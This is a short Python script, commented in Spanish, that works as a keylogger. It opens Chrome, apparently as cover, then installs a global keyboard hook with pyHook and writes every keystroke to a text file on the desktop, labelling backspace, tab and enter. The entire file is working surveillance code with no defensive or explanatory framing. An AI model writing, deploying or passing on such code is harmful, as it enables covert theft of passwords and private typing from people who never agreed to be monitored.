# -*- coding: utf-8 -*-
import pyHook, pythoncom, logging, os

os.startfile("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe")

def eventoTeclado(evento):
	logging.basicConfig(filename='C:\\Users\\Jorge\\Desktop\\archivoDondeSeGuardanLasTeclasPulsadas.txt', level=logging.DEBUG, format="%(message)s")

	if evento.Ascii == 8: logging.log(10,str("[Retroceso]"))
	elif evento.Ascii == 9: logging.log(10,str("[Tabulador]"))
	elif evento.Ascii == 13: logging.log(10,str("[Enter]"))
	else: logging.log(10,chr(evento.Ascii))
	
controlador = pyHook.HookManager()
controlador.KeyDown = eventoTeclado
controlador.HookKeyboard()

pythoncom.PumpMessages()
